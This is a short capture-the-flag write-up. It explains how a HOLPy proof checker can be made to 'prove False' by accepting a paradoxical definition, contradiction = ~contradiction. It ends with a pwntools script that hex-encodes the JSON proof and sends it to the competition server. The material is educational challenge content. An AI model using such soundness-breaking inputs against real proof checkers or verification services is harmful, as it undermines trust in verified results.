Challenge 2: Customer Service (HOLPy Proof Checker)

Vulnerability Analysis

The program checks HOL theorem proofs and calls win() if you can prove False with no assumptions:

def theorem_proves_false_unconditioned(thm):
    is_false = thm.concl.is_const("false")
    no_assumptions = len(thm.assums) == 0
    no_hypotheses = len(thm.hyps) == 0
    return is_false and no_assumptions and no_hypotheses

The Vulnerability

The checker allows adding definitions via new_definition but doesn't properly validate their consistency. A paradoxical definition like P = ~P makes the theory inconsistent, allowing derivation of False.

Exploit Strategy

Create a JSON proof that:

  1. Defines a constant contradiction
  2. Defines it as contradiction = ~contradiction (a paradox)
  3. This single definition creates inconsistency

Final Exploit

#!/usr/bin/env python3
import json
from pwn import *

# Create a paradoxical definition
exploit = {
    "imports": [],
    "content": [
        {
            "ty": "const",
            "name": "contradiction",
            "type": "bool"
        },
        {
            "ty": "definition",
            "name": "paradox",
            "term": "contradiction = ~contradiction"
        }
    ]
}

# Convert to hex
json_str = json.dumps(exploit)
hex_proof = json_str.encode().hex()

# Connect and send
conn = remote("blackened-fish-fingers-atop-pickled-carbonara-wrlf.gpn24.ctf.kitctf.de", 443, ssl=True)
conn.sendline(hex_proof.encode())
print(conn.recvall().decode())
conn.close()

Why It Works

  • The definition contradiction = ~contradiction is inherently inconsistent
  • HOLPy accepts it as a valid definition (no conservativity check)
  • This single axiom makes the entire theory inconsistent
  • False is provable, triggering win()

Lessons Learned

  • A single inconsistent axiom can collapse a logic.
